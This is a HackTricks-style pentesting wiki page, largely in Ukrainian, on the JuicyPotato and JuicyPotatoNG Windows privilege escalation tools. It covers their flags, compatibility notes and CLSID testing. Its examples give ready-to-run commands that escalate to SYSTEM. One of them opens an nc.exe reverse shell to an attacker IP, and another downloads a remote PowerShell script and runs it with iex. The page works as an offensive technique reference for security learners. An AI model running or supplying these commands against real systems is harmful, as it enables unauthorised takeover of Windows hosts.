# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato is legacy. It generally works on Windows versions up to Windows 10 1803 / Windows Server 2016. Microsoft changes shipped starting in Windows 10 1809 / Server 2019 broke the original technique. For those builds and newer, consider modern alternatives such as PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato and others. See the page below for up-to-date options and usage.


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (abusing the golden privileges) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_A sugared version of_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, with a bit of juice, i.e. **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_

#### Ви можете завантажити juicypotato з [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Compatibility quick notes

- Працює стабільно до Windows 10 1803 та Windows Server 2016, коли поточний контекст має SeImpersonatePrivilege або SeAssignPrimaryTokenPrivilege.
- Пошкоджено заходами посилення безпеки Microsoft у Windows 10 1809 / Windows Server 2019 і новіших версіях. Для цих збірок віддавайте перевагу альтернативам, наведеним вище.

### Summary <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) leverages the privilege escalation chain based on [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) having the MiTM listener on `127.0.0.1:6666` and when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges. During a Windows build review we found a setup where `BITS` was intentionally disabled and port `6666` was taken.

Ми вирішили озброїти [RottenPotatoNG]: **Зустрічайте Juicy Potato**.

> Для теорії див. [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) та перегляньте пов'язані посилання і джерела.

Ми виявили, що, окрім `BITS`, існує кілька COM-серверів, які можна використати. Вони лише повинні:

1. бути ініціалізованими поточним користувачем, зазвичай «service user», який має привілеї імперсонації
2. реалізовувати інтерфейс IMarshal
3. запускатися від імені підвищеного користувача (SYSTEM, Administrator, …)

Після деяких тестів ми отримали і перевірили великий список [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) на кількох версіях Windows.

### Juicy details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato дозволяє вам:

- **Target CLSID** _оберіть будь-який CLSID, який ви хочете._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _тут ви знайдете список, організований за ОС._
- **COM Listening port** _вкажіть бажаний COM-порт для прослуховування (замість маршалованого жорстко закодованого 6666)_
- **COM Listening IP address** _прив'яжіть сервер до будь-якої IP-адреси_
- **Process creation mode** _залежно від привілеїв імперсонованого користувача ви можете обрати з:_
- `CreateProcessWithToken` (needs `SeImpersonate`)
- `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _запустити виконуваний файл або скрипт у разі успіху експлуатації_
- **Process Argument** _налаштуйте аргументи запущеного процесу_
- **RPC Server address** _для прихованого підходу ви можете автентифікуватися на зовнішньому RPC-сервері_
- **RPC Server port** _корисно якщо ви хочете автентифікуватися на зовнішньому сервері і firewall блокує порт `135`…_
- **TEST mode** _в основному для тестових цілей, тобто тестування CLSIDів. Він створює DCOM і виводить користувача токена. Див. [_here for testing_](http://ohpe.it/juicy-potato/Test/)_

### Usage <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Підсумки <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Якщо користувач має привілеї `SeImpersonate` або `SeAssignPrimaryToken`, то ви — **SYSTEM**.

Практично неможливо повністю запобігти зловживанню всіма цими COM Servers. Можна спробувати змінити дозволи цих об’єктів через `DCOMCNFG`, але удачі — це буде складно.

Реальне рішення — захистити чутливі облікові записи та додатки, які працюють під обліковими записами `* SERVICE`. Зупинка `DCOM` безумовно ускладнить цей експлойт, але може серйозно вплинути на базову ОС.

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG відновлює JuicyPotato-style local privilege escalation на сучасних Windows, поєднуючи:
- розв'язання DCOM OXID до локального RPC-сервера на вибраному порту, уникаючи старого жорстко закодованого 127.0.0.1:6666 listener'а;
- SSPI hook для перехоплення та імперсонації вхідної аутентифікації SYSTEM без потреби в RpcImpersonateClient, що також дозволяє CreateProcessAsUser коли присутня лише SeAssignPrimaryTokenPrivilege;
- трюки для задоволення обмежень активації DCOM (наприклад, колишня вимога INTERACTIVE-group при таргетуванні класів PrintNotify / ActiveX Installer Service).

Важливі зауваги (поведінка змінюється між збірками):
- September 2022: первісна техніка працювала на підтримуваних Windows 10/11 і Server таргетах, використовуючи “INTERACTIVE trick”.
- January 2023 update from the authors: Microsoft пізніше заблокував INTERACTIVE trick. Інший CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) відновлює можливість експлуатації, але, за їхнім повідомленням, тільки на Windows 11 / Server 2022.

Базове використання (більше прапорів у довідці):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Якщо ви націлюєтеся на Windows 10 1809 / Server 2019, де класичний JuicyPotato виправлено, віддавайте перевагу альтернативам, згаданим вище (RoguePotato, PrintSpoofer, EfsPotato/GodPotato тощо). NG може бути ситуативним залежно від збірки та стану сервісу.

## Examples

Примітка: Відвідайте [this page](https://ohpe.it/juicy-potato/CLSID/) для списку CLSIDs, які можна спробувати.

### Отримати nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell реверс
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Запустити новий CMD (якщо у вас є доступ через RDP)

![](<../../images/image (300).png>)

## Проблеми з CLSID

Часто стандартний CLSID, який використовує JuicyPotato, **не працює**, і експлойт зазнає невдачі. Зазвичай потрібно кілька спроб, щоб знайти **працюючий CLSID**. Щоб отримати список CLSID для конкретної операційної системи, відвідайте цю сторінку:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Перевірка CLSID**

Спочатку вам знадобляться додаткові виконувані файли, окрім juicypotato.exe.

Завантажте [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) і завантажте його в вашу PS-сесію, потім завантажте та виконайте [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Цей скрипт створить список можливих CLSID для перевірки.

Потім завантажте [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(змініть шлях до списку CLSID та до виконуваного файлу juicypotato) і запустіть його. Він почне перевіряти кожен CLSID, і коли зміниться номер порту, це означатиме, що CLSID спрацював.

**Перевірте** працездатні CLSID **за допомогою параметра -c**

## Посилання

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
